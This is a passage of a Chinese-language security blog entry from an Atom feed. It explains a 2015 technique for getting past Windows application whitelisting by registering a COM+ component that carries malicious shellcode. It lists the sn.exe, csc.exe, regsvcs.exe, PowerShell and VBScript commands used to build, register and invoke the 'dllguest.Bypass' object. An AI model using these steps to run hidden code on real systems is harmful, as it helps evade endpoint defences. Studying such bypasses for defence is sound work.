data-wiz-span="data-wiz-span" style="font-size: 16pt;">COM+</span></span></strong><span style="font-size:10.5pt"><strong><span data-wiz-span="data-wiz-span" style="font-size: 16pt;">应用</span></strong><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span style="font-size:10.5pt">把我们的恶意</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">shellcode</span><span style="font-size:10.5pt">写入</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">COM+</span><span style="font-size:10.5pt">应用中<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <code>&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET SDK&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; sn&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;snk&lt;/span&gt;</code><br>2.  <code>&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\csc&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;EnterpriseServices&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;keyfile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;snk &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;library &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;cs&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;As&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Administrator&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\Windows\Microsoft&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;NET\Framework\v&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4.0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30319&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;\regsvcs&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exe dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;dll&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;PowerShell&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;$b &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;New&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;ComObject&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; dllguest&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;bypass&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OR&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;From&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;VBScript&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Dim&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; obj &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Set&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; obj &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;CreateObject&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;dllguest.Bypass&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;</code></pre></div><p><span style="font-size:10.5pt">使用原作的</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">demo</span><span style="font-size:10.5pt">：<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span lang="EN-US"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/08/wpid-246eb96d9089329411f3bc69316f535d_clip_image0149996df9e-a63a-40ea-a02c-014cb8e7760a.jpg" alt="说明: 计算机生成了可选文字: ＿少曰到囚编辑汪）帮助以）一口l困查看仅〕编辑伍〕帮助以〕口1整莱口口口‘习到困查看汉）编辑但〕帮助以）器一算一以计一看属一查0州州习习习引到习习习川习习川习到到习川到到到习曰｝习习二习州习习习到到习习川川习习川川习习习川国习到习曰｝习习二01习习习到引到习习习习习习州习到到到习州到到到到曰。习到习习习l一一卜．.......~C：劝se护s从pentest从DesktoP勺llore双＞sn。exe一kke，。．nk洲iCr0S0ft&lt;R&gt;Cop夕护ight&lt;c&gt;。HETFraoe衬orkStrongHic护。‘oftCorporationHaoeUtilit夕nllrightsUersion3。5。21022。8re,erued-l(e夕Pai护公护ittentoke夕。snkC：劝se护s\Pentest叨esktoP腼ore双＞C：喇indo&quot;s训icrosoft.HFT甲护ane&quot;ork切4。日。3日319嗽sc。exe／护：S夕ste。。Fnte护P护i公ese护uices。dll/ke夕file:ke夕。‘nk/target:lib护a护夕／out:dllgue">&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span style="font-size:10.5pt">虽然</span><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;">demo</span><span style="font-size:10.5pt">写的不是很完美，测试的时候出了很多错，但已经能够表明作者“利用白名单应用执行恶意代码”的目的。<span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span style="font-size:10.5pt"><br></span></p><p><span lang="EN-US" style="font-size:10.5pt">&nbsp;&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;"><strong>0x03</strong></span></span><span style="font-size:10.5pt"><span data-wiz-span="data-wiz-span" style="font-size: 16pt;"><strong>原文：</strong></span><span lang="EN-US">&lt;o:p&gt;&lt;/o:p&gt;</span></span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><a href="http://subt0x10.blogspot.com/2015/08/hiding-in-plain-sight-com-surrogate.html" target="_blank" rel="noopener">http://subt0x10.blogspot.com/2015/08/hiding-in-plain-sight-com-surrogate.html</a>&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US"><a href="https://github.com/subTee/ShmooCon-2015" target="_blank" rel="noopener"><span style="font-size:9.5pt;font-family:&quot;Arial&quot;,&quot;sans-serif&quot;;background:white">https://github.com/subTee/ShmooCon-2015</span></a>&lt;o:p&gt;&lt;/o:p&gt;</span></p><p><span lang="EN-US" style="font-size:10.5pt;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;"><a href="http://subt0x10.blogspot.com/2015/08/application-whitelisting-bypasses-101.html" target="_blank" rel="noopener">http://subt0x10.blogspot.com/2015/08/application-whitelisting-bypasses-101.html</a>&lt;o:p&gt;&lt;/o:p&gt;</span></p><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size: 10.5pt; line-height: 1.5; font-family: Calibri, sans-serif;&quot;&gt;&lt;span data-wiz-span=&quot;data-wiz-s
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
</feed>
